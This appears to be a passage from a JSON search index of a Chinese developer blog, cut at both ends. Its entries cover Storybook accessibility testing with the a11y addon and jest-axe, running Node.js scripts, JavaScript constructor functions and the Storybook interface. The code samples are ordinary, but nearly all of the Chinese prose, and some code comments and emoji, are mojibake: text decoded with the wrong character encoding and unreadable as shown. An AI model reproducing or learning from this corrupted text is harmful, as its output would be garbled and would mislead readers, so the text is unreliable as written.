¸ï¼Œä»¥ä¾¿æä¾›å¿«é€Ÿåé¦ˆå¾ªç¯ã€‚ å®ƒç”± Deque çš„ axe-core æä¾›æ”¯æŒï¼Œå¯è‡ªåŠ¨æ•è·å¤šè¾¾ 57% çš„ WCAG é—®é¢˜ã€‚\n\rè®¾ç½® a11y æ’ä»¶ è¦ä½¿ç”¨ Storybook å¯è®¿é—®æ€§æµ‹è¯•ï¼Œéœ€è¦å®‰è£… @storybook/addon-a11y æ’ä»¶ã€‚ è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n1 2  yarn add --dev @storybook/addon-a11y   æ›´æ–° Storybook é…ç½®ï¼ˆåœ¨ .storybook/main.js ä¸­ï¼‰ä»¥åŒ…å«å¯è®¿é—®æ€§æ’ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11  // .storybook/main.js  module.exports = { stories:[], addons:[ \u0026#39;@storybook/addon-links\u0026#39;, \u0026#39;@storybook/addon-essentials\u0026#39;, \u0026#39;@storybook/preset-create-react-app\u0026#39;, \u0026#39;@storybook/addon-a11y\u0026#39;, //ğŸ‘ˆ The a11y addon goes here };   å¯åŠ¨ Storybookï¼Œåœ¨ UI ä¸­çœ‹åˆ°ä¸€äº›æ˜æ˜¾çš„å·®å¼‚ã€‚ ä¸€ä¸ªæ–°çš„å·¥å…·æ å›¾æ ‡å’Œå¯è®¿é—®æ€§é¢æ¿ï¼Œå¯ä»¥åœ¨å…¶ä¸­æ£€æŸ¥æµ‹è¯•ç»“æœã€‚\n\rå®ƒå¦‚ä½•å·¥ä½œï¼Ÿ Storybook çš„ a11y æ’ä»¶åœ¨é€‰å®šçš„æ•…äº‹ä¸Šè¿è¡Œ Axã€‚ å…è®¸å¼€å‘è¿‡ç¨‹ä¸­å‘ç°å’Œä¿®å¤å¯è®¿é—®æ€§é—®é¢˜ã€‚\nä¾‹å¦‚ï¼Œå¦‚æœæ­£åœ¨å¤„ç†æŒ‰é’®ç»„ä»¶å¹¶åŒ…å«ä»¥ä¸‹æ•…äº‹é›†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // Button.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { Button } from \u0026#39;./Button\u0026#39;; export default { title: \u0026#39;Accessibility testing\u0026#39;, component: Button, argTypes: { backgroundColor: { control: \u0026#39;color\u0026#39; }, }, } as ComponentMeta\u0026lt;typeof Button\u0026gt;; const Template: ComponentStory\u0026lt;typeof Button\u0026gt; = (args) =\u0026gt; \u0026lt;Button {...args} /\u0026gt;; // This is an accessible story export const Accessible = Template.bind({}); Accessible.args = { primary: false, label: \u0026#39;Button\u0026#39;, }; // This is not export const Inaccessible = Template.bind({}); Inaccessible.args = { ...Accessible.args, backgroundColor: \u0026#39;red\u0026#39;, };   åå¤æµè§ˆè¿™ä¸¤ä¸ªæ•…äº‹ï¼Œä¼šçœ‹åˆ°æ— æ³•è®¿é—®çš„æ•…äº‹åŒ…å«ä¸€äº›éœ€è¦ä¿®å¤çš„é—®é¢˜ã€‚\nåœ¨å¯è®¿é—®æ€§é¢æ¿ä¸­æ‰“å¼€è¿è§„é€‰é¡¹å¡å¯ä»¥æ¸…æ¥šåœ°æè¿°å¯è®¿é—®æ€§é—®é¢˜ä»¥åŠè§£å†³è¯¥é—®é¢˜çš„æŒ‡å—ã€‚\n\ré…ç½® å¼€ç®±å³ç”¨ï¼ŒStorybook çš„å¯è®¿é—®æ€§æ’ä»¶åŒ…æ‹¬ä¸€ç»„æ¶µç›–å¤§å¤šæ•°é—®é¢˜çš„å¯è®¿é—®æ€§è§„åˆ™ã€‚\nè¿˜å¯ä»¥å¾®è°ƒæ’ä»¶é…ç½®æˆ–è¦†ç›– Axe çš„è§„åˆ™é›†ä»¥æœ€é€‚åˆéœ€æ±‚ã€‚\nå…¨å±€é…ç½® a11y å¦‚æœéœ€è¦åœ¨æ‰€æœ‰æ•…äº‹ä¸­å–æ¶ˆå¯è®¿é—®æ€§è§„åˆ™æˆ–ä¿®æ”¹å…¶è®¾ç½®ï¼Œå¯ä»¥å°†ä»¥ä¸‹å†…å®¹æ·»åŠ åˆ° storybook/preview.jsï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // .storybook/preview.js  export const parameters = { a11y: { // è¦æ£€æŸ¥çš„å¯é€‰é€‰æ‹©å™¨  element: \u0026#39;#root\u0026#39;, config: { rules: [ { // è‡ªåŠ¨å®Œæˆè§„åˆ™å°†ä¸ä¼šæ ¹æ®æä¾›çš„ CSS é€‰æ‹©å™¨è¿è¡Œ  id: \u0026#39;autocomplete-valid\u0026#39;, selector: \u0026#39;*:not([autocomplete=\u0026#34;nope\u0026#34;])\u0026#39;, }, { // å°† enabled é€‰é¡¹è®¾ç½®ä¸º false å°†ç¦ç”¨å¯¹æ‰€æœ‰æ•…äº‹çš„æ­¤ç‰¹å®šè§„åˆ™çš„æ£€æŸ¥ã€‚  id: \u0026#39;image-alt\u0026#39;, enabled: false, }, ], }, // Axe çš„é€‰é¡¹å‚æ•°  options: {}, // é˜²æ­¢è‡ªåŠ¨æ£€æŸ¥çš„å¯é€‰æ ‡å¿—  manual: true, }, };   ç»„ä»¶çº§ a11y é…ç½® è¿˜å¯ä»¥ä¸ºç»„ä»¶çš„æ‰€æœ‰æ•…äº‹è‡ªå®šä¹‰è‡ªå·±çš„è§„åˆ™é›†ã€‚ æ›´æ–°æ•…äº‹çš„é»˜è®¤å¯¼å‡ºå¹¶æ·»åŠ å…·æœ‰æ‰€éœ€é…ç½®çš„å‚æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // MyComponent.stories.js|jsx|ts|tsx  import { MyComponent } from \u0026#39;./MyComponent\u0026#39;; export default { title: \u0026#39;Configure a11y addon\u0026#39;, component: MyComponent, parameters: { a11y: { // è¦æ£€æŸ¥çš„å¯é€‰é€‰æ‹©å™¨  element: \u0026#39;#root\u0026#39;, config: { rules: [ { // è‡ªåŠ¨å®Œæˆè§„åˆ™å°†ä¸ä¼šæ ¹æ®æä¾›çš„ CSS é€‰æ‹©å™¨è¿è¡Œ  id: \u0026#39;autocomplete-valid\u0026#39;, selector: \u0026#39;*:not([autocomplete=\u0026#34;nope\u0026#34;])\u0026#39;, }, { // å°† enabled é€‰é¡¹è®¾ç½®ä¸º false å°†ç¦ç”¨å¯¹æ‰€æœ‰æ•…äº‹çš„æ­¤ç‰¹å®šè§„åˆ™çš„æ£€æŸ¥ã€‚  id: \u0026#39;image-alt\u0026#39;, enabled: false, }, ], }, options: {}, manual: true, }, }, };   æ•…äº‹çº§ a11y é…ç½® é€šè¿‡æ›´æ–°æ•…äº‹ä»¥åŒ…å«æ–°å‚æ•°ï¼Œè‡ªå®šä¹‰æ•…äº‹çº§åˆ«çš„ a11y è§„åˆ™é›†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // MyComponent.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { MyComponent } from \u0026#39;./MyComponent\u0026#39;; export default { title: \u0026#39;Configure a11y addon\u0026#39;, component: MyComponent, } as ComponentMeta\u0026lt;typeof MyComponent\u0026gt;; const Template: ComponentStory\u0026lt;typeof MyComponent\u0026gt; = () =\u0026gt; \u0026lt;MyComponent /\u0026gt;; export const ExampleStory = Template.bind({}); ExampleStory.parameters = { a11y: { element: \u0026#39;#root\u0026#39;, config: { rules: [ { // è‡ªåŠ¨å®Œæˆè§„åˆ™å°†ä¸ä¼šæ ¹æ®æä¾›çš„ CSS é€‰æ‹©å™¨è¿è¡Œ  id: \u0026#39;autocomplete-valid\u0026#39;, selector: \u0026#39;*:not([autocomplete=\u0026#34;nope\u0026#34;])\u0026#39;, }, { // å°† enabled é€‰é¡¹è®¾ç½®ä¸º false å°†ç¦ç”¨å¯¹æ‰€æœ‰æ•…äº‹çš„æ­¤ç‰¹å®šè§„åˆ™çš„æ£€æŸ¥ã€‚  id: \u0026#39;image-alt\u0026#39;, enabled: false, }, ], }, options: {}, manual: true, }, };   å¦‚ä½•ç¦ç”¨ a11y æµ‹è¯• é€šè¿‡å°†ä»¥ä¸‹å‚æ•°åˆ†åˆ«æ·»åŠ åˆ°æ•…äº‹çš„å¯¼å‡ºæˆ–ç»„ä»¶çš„é»˜è®¤å¯¼å‡ºï¼Œç¦ç”¨æ•…äº‹æˆ–ç»„ä»¶çš„å¯è®¿é—®æ€§æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // MyComponent.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { MyComponent } from \u0026#39;./MyComponent\u0026#39;; export default { title: \u0026#39;Disable a11y addon\u0026#39;, component: MyComponent, } as ComponentMeta\u0026lt;typeof MyComponent\u0026gt;; const Template: ComponentStory\u0026lt;typeof MyComponent\u0026gt; = () =\u0026gt; \u0026lt;MyComponent /\u0026gt;; export const NonA11yStory = Template.bind({}); NonA11yStory.parameters = { a11y: { // æ­¤é€‰é¡¹ç¦ç”¨å¯¹æ­¤æ•…äº‹çš„æ‰€æœ‰ a11y æ£€æŸ¥  disable: true, }, };   \rä½¿ç”¨ Jest è‡ªåŠ¨åŒ–å¯è®¿é—®æ€§æµ‹è¯• ä½¿ç”¨ Storybook è¿›è¡Œå¯è®¿é—®æ€§æµ‹è¯•ç¼©çŸ­äº†åé¦ˆå¾ªç¯ï¼Œè¿™æ„å‘³ç€å¯ä»¥æ›´å¿«åœ°è§£å†³é—®é¢˜ã€‚\nåœ¨ Jest æµ‹è¯•ä¸­é‡ç”¨æ•…äº‹ï¼Œå¹¶ä½¿ç”¨ jest-axe é›†æˆå¯¹å®ƒä»¬è¿è¡Œå¯è®¿é—®æ€§å®¡æ ¸ã€‚\nè¿™ä¹Ÿè§£é”äº†å°†å¯è®¿é—®æ€§æµ‹è¯•é›†æˆåˆ°åŠŸèƒ½æµ‹è¯•ç®¡é“ä¸­çš„èƒ½åŠ›ã€‚\nä¾‹å¦‚ï¼ŒåŒ…å«ä»¥ä¸‹æµ‹è¯•æ–‡ä»¶ä»¥å¯¹æ•…äº‹è¿è¡Œå¯è®¿é—®æ€§æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // MyComponent.test.js  import { render } from \u0026#39;@testing-library/react\u0026#39;; import { composeStories } from \u0026#39;@storybook/testing-react\u0026#39;; import { axe, toHaveNoViolations } from \u0026#39;jest-axe\u0026#39;; import * as MyComponentStories from \u0026#39;./MyComponent.stories\u0026#39;; const { Accessible } = composeStories(MyComponentStories); expect.extend(toHaveNoViolations); test(\u0026#39;Example accessiblity test\u0026#39;, async () =\u0026gt; { const { container } = render(\u0026lt;Accessible /\u0026gt;); const AxeResults = await axe(container); expect(AxeResults).toHaveNoViolations(); });   å½“æ‰§è¡Œæµ‹è¯•è„šæœ¬æ—¶ï¼Œå®ƒå°†è¿è¡Œå¯è®¿é—®æ€§å®¡æ ¸ä»¥åŠå¯èƒ½æ‹¥æœ‰çš„ä»»ä½•äº¤äº’æµ‹è¯•ã€‚\nåŸºäºæµè§ˆå™¨å’ŒåŸºäº linter çš„å¯è®¿é—®æ€§æµ‹è¯•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ\nåŸºäºæµè§ˆå™¨çš„å¯è®¿é—®æ€§æµ‹è¯•ï¼ˆå¦‚ Storybook ä¸­çš„å†…å®¹ï¼‰ä¼šè¯„ä¼°æ¸²æŸ“çš„ DOMï¼Œå› ä¸ºè¿™å¯ä»¥ä¸ºæ‚¨æä¾›æœ€é«˜çš„å‡†ç¡®åº¦ã€‚\nå°šæœªç¼–è¯‘çš„å®¡è®¡ä»£ç æ˜¯ä»çœŸå®ä»£ç ä¸­åˆ é™¤çš„ä¸€æ­¥ï¼Œå› æ­¤ä¸ä¼šæ•è·ç”¨æˆ·å¯èƒ½é‡åˆ°çš„æ‰€æœ‰å†…å®¹ã€‚\n\rçŸ¥è¯†ç‚¹  a11y æ’ä»¶  ","description":"å¯è®¿é—®æ€§æµ‹è¯• å¯è®¿é—®æ€§","id":68,"section":"react","tags":null,"title":"å¯è®¿é—®æ€§æµ‹è¯•","uri":"https://codthing.github.io/react/storybook/sb-test/sb-accessibility-testing/"},{"content":"ä¸€ã€V8 JavaScript å¼•æ“ V8 æ˜¯æ”¯æŒ Google Chrome çš„ JavaScript å¼•æ“çš„åç§°ã€‚\nV8 æ˜¯ç”¨ C++ ç¼–å†™çš„ã€‚å®ƒæ˜¯ä¾¿æºå¼çš„ï¼Œå¯åœ¨ Macã€Windowsã€Linux å’Œå…¶ä»–å‡ ä¸ªç³»ç»Ÿä¸Šè¿è¡Œã€‚ã€‚\nå¾ˆé…·çš„ä¸€ç‚¹æ˜¯ JavaScript å¼•æ“ç‹¬ç«‹äºå®ƒæ‰€åœ¨çš„æµè§ˆå™¨ã€‚\nè¿™ä¸€å…³é”®ç‰¹æ€§ä¿ƒæˆäº† Node.js çš„å…´èµ·ã€‚æ—©åœ¨ 2009 å¹´ï¼ŒV8 å°±è¢«é€‰ä¸ºæ”¯æŒ Node.js çš„å¼•æ“ï¼Œéšç€ Node.js çš„æ™®åŠï¼ŒV8 æˆä¸ºç°åœ¨æ”¯æŒå¤§é‡ç”¨ JavaScript ç¼–å†™çš„æœåŠ¡å™¨ç«¯ä»£ç çš„å¼•æ“ã€‚\n\räºŒã€å…¶ä»– JS å¼•æ“ å…¶ä»–æµè§ˆå™¨æœ‰è‡ªå·±çš„ JavaScript å¼•æ“ï¼š\n Firefox æœ‰ SpiderMonkey Safari å…·æœ‰ JavaScriptCoreï¼ˆä¹Ÿç§°ä¸º Nitroï¼‰ Edge æœ€åˆåŸºäº Chakraï¼Œä½†æœ€è¿‘ä½¿ç”¨ Chromium å’Œ V8 å¼•æ“è¿›è¡Œäº†é‡å»ºã€‚  \rä¸‰ã€æ±‡ç¼– JavaScript é€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ç§è§£é‡Šå‹è¯­è¨€ï¼Œä½†ç°ä»£ JavaScript å¼•æ“ä¸å†åªæ˜¯è§£é‡Š JavaScriptï¼Œè€Œæ˜¯ç¼–è¯‘å®ƒã€‚\nç¼–è¯‘ JavaScript éå¸¸æœ‰æ„ä¹‰ï¼Œè™½ç„¶å‡†å¤‡å¥½ JavaScript å¯èƒ½éœ€è¦æ›´å¤šæ—¶é—´ï¼Œä½†ä¸€æ—¦å®Œæˆï¼Œå®ƒçš„æ€§èƒ½å°†æ¯”çº¯è§£é‡Šä»£ç é«˜å¾—å¤šã€‚\n\rå››ã€ä»å‘½ä»¤è¡Œè¿è¡Œ Node.js è„šæœ¬ 1 2 3  // å‘Šè¯‰ shell ä½¿ç”¨ node.js è¿è¡Œè„šæœ¬ node app.js   1 2 3  // è§£é‡Šå™¨çš„ç»å¯¹è·¯å¾„ #!/usr/bin/node   1 2 3 4 5  // ä»¥ node ä½œä¸ºå‚æ•°è¿è¡Œ env #!/usr/bin/env node // your code   1 2 3  // æˆäºˆ app.js å¯æ‰§è¡Œæƒé™ï¼š chmod u+x app.js   ","description":"","id":69,"section":"nodejs","tags":null,"title":"å¼•æ“å’Œè¿è¡Œæ–¹å¼","uri":"https://codthing.github.io/nodejs/nodebase/node-engine/"},{"content":"ä¸€ã€å®šä¹‰æ„é€ å‡½æ•° Constructors æ˜¯åˆ›å»ºå¯¹è±¡çš„å‡½æ•°ã€‚\nå‡½æ•°ç»™è¿™ä¸ªæ–°å¯¹è±¡å®šä¹‰å±æ€§å’Œè¡Œä¸ºã€‚ å¯å°†å®ƒä»¬è§†ä¸ºåˆ›å»ºçš„æ–°å¯¹è±¡çš„è“å›¾ã€‚\n1 2 3 4 5  function Bird() { this.name = \u0026#34;Albert\u0026#34;; this.color = \u0026#34;blue\u0026#34;; this.numLegs = 2; }   è¿™ä¸ªæ„é€ å‡½æ•°å®šä¹‰äº†ä¸€ä¸ª Bird å¯¹è±¡ï¼Œ\nå…¶å±æ€§ nameã€color å’Œ numLegs çš„å€¼åˆ†åˆ«è¢«è®¾ç½®ä¸º Albertã€blue å’Œ 2ã€‚\næ„é€ å‡½æ•°éµå¾ªä¸€äº›æƒ¯ä¾‹è§„åˆ™ï¼š\n  æ„é€ å‡½æ•°å‡½æ•°åçš„é¦–å­—æ¯å¤§å†™ï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬åŒºåˆ†æ„é€ å‡½æ•°ï¼ˆ constructorsï¼‰å’Œå…¶ä»–éæ„é€ å‡½æ•°ã€‚\n  æ„é€ å‡½æ•°ä½¿ç”¨ this å…³é”®å­— æ¥ç»™å®ƒå°†åˆ›å»ºçš„è¿™ä¸ªå¯¹è±¡è®¾ç½®æ–°çš„å±æ€§ã€‚ åœ¨æ„é€ å‡½æ•°é‡Œé¢ï¼Œthis æŒ‡å‘çš„å°±æ˜¯å®ƒæ–°åˆ›å»ºçš„è¿™ä¸ªå¯¹è±¡ã€‚\n  æ„é€ å‡½æ•°å®šä¹‰äº†å±æ€§å’Œè¡Œä¸ºå°±å¯åˆ›å»ºå¯¹è±¡ï¼Œè€Œä¸æ˜¯åƒå…¶ä»–å‡½æ•°ä¸€æ ·éœ€è¦è®¾ç½®è¿”å›å€¼ã€‚\n  \räºŒã€ä½¿ç”¨æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡ 1 2 3 4 5 6 7  function Bird() { this.name = \u0026#34;Albert\u0026#34;; this.color = \u0026#34;blue\u0026#34;; this.numLegs = 2; } let blueBird = new Bird();   æ³¨æ„ï¼š æ„é€ å‡½æ•°å†…çš„ this æ€»æ˜¯æŒ‡è¢«åˆ›å»ºçš„å¯¹è±¡ã€‚\næ³¨æ„ï¼š é€šè¿‡æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡çš„æ—¶å€™è¦ä½¿ç”¨ new æ“ä½œç¬¦ã€‚ å› ä¸ºåªæœ‰è¿™æ ·ï¼ŒJavaScript æ‰çŸ¥é“è¦ç»™ Bird è¿™ä¸ªæ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹ï¼šblueBirdã€‚ å¦‚æœä¸ä½¿ç”¨ new æ“ä½œç¬¦æ¥æ–°å»ºå¯¹è±¡ï¼Œé‚£ä¹ˆæ„é€ å‡½æ•°é‡Œé¢çš„ this å°±æ— æ³•æŒ‡å‘æ–°åˆ›å»ºçš„è¿™ä¸ªå¯¹è±¡å®ä¾‹ï¼Œä»è€Œäº§ç”Ÿä¸å¯é¢„è§çš„é”™è¯¯ã€‚ ç°åœ¨ blueBird è¿™ä¸ªå®ä¾‹å°±ç»§æ‰¿äº†Bird æ„é€ å‡½æ•°çš„æ‰€æœ‰å±æ€§ï¼Œ\nç”±æ„é€ å‡½æ•°åˆ›å»ºçš„å®ä¾‹ä¹Ÿå’Œå…¶ä»–å¯¹è±¡ä¸€æ ·ï¼Œå®ƒçš„å±æ€§å¯ä»¥è¢«è®¿é—®å’Œä¿®æ”¹ï¼š\n1 2 3 4 5 6  blueBird.name; // Albert blueBird.color; // blue blueBird.numLegs; // 2  blueBird.name = \u0026#39;Elvira\u0026#39;; blueBird.name; // Elvira   \rä¸‰ã€æ‰©å±•æ„é€ å‡½æ•°ä»¥æ¥æ”¶å‚æ•° æ³¨æ„åˆ°æ²¡æœ‰ï¼šæ‰€æœ‰é€šè¿‡Bird æ„é€ å‡½æ•°åˆ›å»ºå‡ºæ¥çš„å®ä¾‹ Birds éƒ½è‡ªåŠ¨çš„å–åä¸º Albertï¼Œé¢œè‰²éƒ½æ˜¯è“è‰²ï¼Œè¿˜éƒ½æœ‰ä¸¤æ¡è…¿ã€‚\nå¦‚æœæƒ³è¦æ–°åˆ›å»ºå‡ºæ¥çš„å°é¸Ÿä»¬æ‹¥æœ‰ä¸åŒçš„åå­—å’Œé¢œè‰²è¦æ€ä¹ˆåŠå‘¢ï¼Ÿ\nå½“ç„¶ï¼Œæ‰‹åŠ¨çš„å»ä¿®æ”¹æ¯ä¸€ä¸ªå°é¸Ÿå®ä¾‹è‡ªå·±çš„å±æ€§ä¹Ÿæ˜¯å¯ä»¥å®ç°çš„ï¼Œåªæ˜¯ä¼šå¢åŠ å¾ˆå¤šæ— è°“çš„å·¥ä½œé‡ï¼š\n1 2 3  let swan = new Bird(); swan.name = \u0026#34;Carlos\u0026#34;; swan.color = \u0026#34;white\u0026#34;;   å‡å¦‚å†™äº†ä¸€ä¸ªç¨‹åºæ¥è¿½è¸ªä¸€ä¸ªé¸Ÿèˆé‡Œé¢çš„å‡ ç™¾åªç”šè‡³å‡ åƒåªä¸åŒçš„å°é¸Ÿã€‚\nå°†ä¼šèŠ±è´¹å¾ˆå¤šæ—¶é—´å»åˆ›å»ºæ‰€æœ‰çš„å°é¸Ÿå®ä¾‹å¹¶ç»™å®ƒä»¬çš„å±æ€§ä¸€ä¸€ä¿®æ”¹ä¸ºä¸åŒçš„å€¼ã€‚\nä¸ºäº†å‡è½»åˆ›å»ºä¸åŒ Bird å¯¹è±¡çš„å·¥ä½œé‡ï¼Œå¯ä»¥ç»™ä½ çš„ Bird è®¾ç½®ä¸ºå¯ä»¥æ¥æ”¶å‚æ•°çš„æ„é€ å‡½æ•°ï¼š\n1 2 3 4 5  function Bird(name, color) { this.name = name; this.color = color; this.numLegs = 2; }   ç„¶åå°†å€¼é€šè¿‡å‚æ•°çš„æ–¹å¼ä¼ é€’ç»™ Bird æ„é€ å‡½æ•°æ¥å®šä¹‰æ¯ä¸€ä¸ªå”¯ä¸€çš„å°é¸Ÿå®ä¾‹ï¼š\n1  let cardinal = new Bird(\u0026#34;Bruce\u0026#34;, \u0026#34;red\u0026#34;);   è¿™ç»™ Bird çš„ name å’Œ color å±æ€§åˆ†åˆ«èµ‹å€¼ä¸º Bruce å’Œ red è‰²ã€‚\nä½† numLegs å±æ€§ä»ç„¶è®¾ç½®ä¸º 2ã€‚ cardinal æœ‰ä»¥ä¸‹è¿™äº›å±æ€§ï¼š\n1 2 3  cardinal.name // Bruce cardinal.color // red cardinal.numLegs // 2   è¿™æ ·ä¸€æ¥æ„é€ å‡½æ•°å°±å˜å¾—å¾ˆçµæ´»äº†ã€‚\nç°åœ¨å¯ä»¥åœ¨åˆ›å»ºæ¯ä¸ª Bird å®ä¾‹æ—¶ç›´æ¥å®šä¹‰å±æ€§ï¼Œè¿™æ˜¯ JavaScript æ„é€ å‡½æ•°éå¸¸å®ç”¨çš„ç”¨æ³•ä¹‹ä¸€ã€‚\nå®ƒä»¬æ ¹æ®å…±åŒæˆ–ç›¸ä¼¼çš„å±æ€§å’Œè¡Œä¸ºå°†å¯¹è±¡å½’çº³ä¸ºä¸€ç»„ï¼Œå¹¶èƒ½å¤Ÿè‡ªåŠ¨çš„åˆ›å»ºå„è‡ªå®ä¾‹ã€‚\n\rå››ã€ä½¿ç”¨ instanceof éªŒè¯å¯¹è±¡çš„æ„é€ å‡½æ•° å‡¡æ˜¯é€šè¿‡æ„é€ å‡½æ•°åˆ›å»ºå‡ºçš„æ–°å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡éƒ½å«åšè¿™ä¸ªæ„é€ å‡½æ•°çš„ instanceã€‚\nJavaScript æä¾›äº†ä¸€ç§å¾ˆç®€ä¾¿çš„æ–¹æ³•æ¥éªŒè¯è¿™ä¸ªäº‹å®ï¼Œé‚£å°±æ˜¯é€šè¿‡ instanceof æ“ä½œç¬¦ã€‚\ninstanceof å…è®¸å°†å¯¹è±¡ä¸æ„é€ å‡½æ•°ä¹‹é—´è¿›è¡Œæ¯”è¾ƒï¼Œæ ¹æ®å¯¹è±¡æ˜¯å¦ç”±è¿™ä¸ªæ„é€ å‡½æ•°åˆ›å»ºçš„è¿”å› true æˆ–è€… falseã€‚\n1 2 3 4 5 6 7 8 9  let Bird = function(name, color) { this.name = name; this.color = color; this.numLegs = 2; } let crow = new Bird(\u0026#34;Alexis\u0026#34;, \u0026#34;black\u0026#34;); crow instanceof Bird; // true   å¦‚æœä¸€ä¸ªå¯¹è±¡ä¸æ˜¯ä½¿ç”¨æ„é€ å‡½æ•°åˆ›å»ºçš„ï¼Œé‚£ä¹ˆ instanceof å°†ä¼šéªŒè¯è¿™ä¸ªå¯¹è±¡ä¸æ˜¯æ„é€ å‡½æ•°çš„å®ä¾‹ï¼š\n1 2 3 4 5 6 7  let canary = { name: \u0026#34;Mildred\u0026#34;, color: \u0026#34;Yellow\u0026#34;, numLegs: 2 }; canary instanceof Bird; // false   \ræ€»ç»“ æ„é€ å‡½æ•°å¯ä»¥ä¼ å‚ï¼Œæ¯”å­—é¢é‡å¯¹è±¡çµæ´»\n","description":"çµæ´»","id":70,"section":"javascript","tags":null,"title":"æ„é€ å‡½æ•°","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/constructor-fn/"},{"content":"å¦‚ä½•ä½¿ç”¨ Storybook ä½œä¸ºæ„å»ºç»„ä»¶çš„å·¥ä½œåŒºã€‚\n\rä¾§è¾¹æ å’Œ Canvasï¼ˆç”»å¸ƒï¼‰ *.stories.ts æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªç»„ä»¶çš„æ‰€æœ‰æ•…äº‹ã€‚\næ¯ä¸ªæ•…äº‹éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„ä¾§è¾¹æ é¡¹ç›®ã€‚\nå½“å•å‡»ä¸€ä¸ªæ•…äº‹æ—¶ï¼Œå®ƒä¼šåœ¨ Canvas ä¸­å‘ˆç°ä¸€ä¸ªç‹¬ç«‹çš„é¢„è§ˆ iframeã€‚\né€šè¿‡å•å‡»ä¾§æ ä¸­çš„æ•…äº‹åœ¨æ•…äº‹ä¹‹é—´å¯¼èˆªã€‚ å°è¯•ä¾§è¾¹æ æœç´¢ä»¥æŒ‰åç§°æŸ¥æ‰¾æ•…äº‹ã€‚\næˆ–è€…ä½¿ç”¨é”®ç›˜å¿«æ·é”®ã€‚ å•å‡» Storybook çš„èœå•ä»¥æŸ¥çœ‹å¯ç”¨çš„å¿«æ·æ–¹å¼åˆ—è¡¨ã€‚\n\rToolbarï¼ˆå·¥å…·æ ï¼‰ Storybook é™„å¸¦äº†å†…ç½®çš„çœæ—¶å·¥å…·ã€‚ å·¥å…·æ åŒ…å«è°ƒæ•´æ•…äº‹åœ¨ç”»å¸ƒä¸­å‘ˆç°æ–¹å¼çš„å·¥å…·ï¼š\n  ğŸ” ç›´è§‚åœ°ç¼©æ”¾ç»„ä»¶ï¼Œä»¥ä¾¿æ£€æŸ¥ç»†èŠ‚ã€‚\n  ğŸ–¼ æ›´æ”¹ç»„ä»¶èƒŒåçš„æ¸²æŸ“èƒŒæ™¯ï¼Œä»¥ä¾¿éªŒè¯ç»„ä»¶åœ¨ä¸åŒè§†è§‰ä¸Šä¸‹æ–‡ä¸­çš„æ¸²æŸ“æ–¹å¼ã€‚\n  ğŸ“± ä»¥å„ç§å°ºå¯¸å’Œæ–¹å‘å‘ˆç°ç»„ä»¶ã€‚ å®ƒéå¸¸é€‚åˆæ£€æŸ¥ç»„ä»¶çš„å“åº”èƒ½åŠ›ã€‚\n   Docs é€‰é¡¹å¡æ˜¾ç¤ºæœ‰å…³ç»„ä»¶çš„è‡ªåŠ¨ç”Ÿæˆçš„æ–‡æ¡£ï¼ˆä»æºä»£ç æ¨æ–­ï¼‰ã€‚ ä½¿ç”¨æ–‡æ¡£åœ¨ä¸å›¢é˜Ÿå…±äº«å¯é‡ç”¨ç»„ä»¶æ—¶å¾ˆæœ‰å¸®åŠ©ï¼Œä¾‹å¦‚ï¼Œåœ¨è®¾è®¡ç³»ç»Ÿæˆ–ç»„ä»¶åº“ä¸­ã€‚  å·¥å…·æ æ˜¯å¯å®šåˆ¶çš„ã€‚ å¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡æ¥å¿«é€Ÿåˆ‡æ¢ä¸»é¢˜å’Œè¯­è¨€ã€‚ æˆ–è€…ä»ç¤¾åŒºå®‰è£… Storybook å·¥å…·æ æ’ä»¶ä»¥å¯ç”¨é«˜çº§å·¥ä½œæµç¨‹ã€‚\n\rAddonsï¼ˆæ’ä»¶ï¼‰ æ’ä»¶æ˜¯æ‰©å±• Storybook æ ¸å¿ƒåŠŸèƒ½çš„æ’ä»¶ã€‚\nå¯ä»¥åœ¨æ’ä»¶é¢æ¿ä¸­æ‰¾åˆ°å®ƒä»¬ï¼Œè¿™æ˜¯ç”»å¸ƒä¸‹æ–¹ Storybook UI ä¸­çš„ä¸€ä¸ªä¿ç•™ä½ç½®ã€‚ æ¯ä¸ªé€‰é¡¹å¡éƒ½æ˜¾ç¤ºæ’ä»¶ä¸ºæ‰€é€‰æ•…äº‹ç”Ÿæˆçš„å…ƒæ•°æ®ã€æ—¥å¿—æˆ–é™æ€åˆ†æã€‚\n  Controls åŠ¨æ€åœ°ä¸ç»„ä»¶çš„ argsï¼ˆè¾“å…¥ï¼‰äº¤äº’ã€‚ å°è¯•ä½¿ç”¨ç»„ä»¶çš„æ›¿ä»£é…ç½®æ¥å‘ç°è¾¹ç¼˜æƒ…å†µã€‚\n  Actions 